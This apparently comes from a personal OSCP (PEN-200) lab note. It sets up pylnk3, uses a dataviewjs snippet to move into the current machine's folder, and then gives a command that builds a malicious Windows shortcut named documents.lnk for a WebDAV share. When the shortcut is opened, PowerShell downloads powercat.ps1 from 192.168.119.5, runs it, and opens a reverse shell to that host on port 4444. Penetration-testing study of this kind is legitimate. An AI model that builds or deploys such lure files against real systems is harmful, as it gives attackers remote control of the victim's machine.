
Activate pylnk
```
python3 -m venv .venv  && source .venv/bin/activate && pip install pylnk3
```

cd to machine directory
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const machine = page?.MACHINE ?? "NO MACHINE FOUND";

const command = `cd ~/Desktop/PEN200/${machine}`;

dv.paragraph("```bash\n" + command + "\n```");
```



```
pylnk3 create ~/[machine]/webdav/documents.lnk \ --target "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" \ --arguments '-c "IEX(New-Object System.Net.WebClient).DownloadString(\"http://192.168.119.5:8000/powercat.ps1\"); powercat -c 192.168.119.5 -p 4444 -e powershell"'
```